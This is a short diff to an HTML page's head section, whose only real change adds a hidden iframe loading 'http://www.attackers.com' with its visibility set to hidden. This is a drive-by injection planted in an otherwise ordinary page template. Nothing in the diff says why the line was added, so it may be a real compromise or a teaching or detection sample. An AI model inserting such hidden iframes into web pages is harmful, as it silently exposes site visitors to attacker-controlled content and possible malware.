@@ -6,7 +6,7 @@
         <!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
         <!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
         <!--[if gt IE 8]><!-->
-
+<iframe src='http://www.attackers.com' style='visibility: hidden;'></iframe>
         <!--  CSS -->
         <link rel="shortcut icon" href="images/favicon.ico" type="image/x-icon"/>
         <!-- Bootstrap core CSS -->
